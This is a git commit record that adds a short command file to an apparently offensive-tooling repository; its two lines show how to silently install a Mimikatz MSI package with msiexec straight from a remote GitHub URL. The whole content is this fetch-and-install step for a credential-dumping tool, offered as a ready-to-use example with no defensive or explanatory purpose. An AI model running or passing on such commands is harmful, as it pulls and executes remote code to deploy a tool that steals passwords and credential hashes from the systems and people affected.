5d1c06f2d31f4a6478d4c51265fc784486cbce42
Matt homjxi0e <25440152+homjxi0e@users.noreply.github.com>
2018-06-07 23:42:26 -0700

    Create CommandLine.cmd

---
+++ Mimikatz.2.1.1/X64/CommandLine.cmd
@@ -0,0 +1,3 @@
+# Example
+PS:> msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestart
+cmd:> msiexec.exe /passive /i https://github.com/homjxi0e/PowerScript/raw/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi /norestart
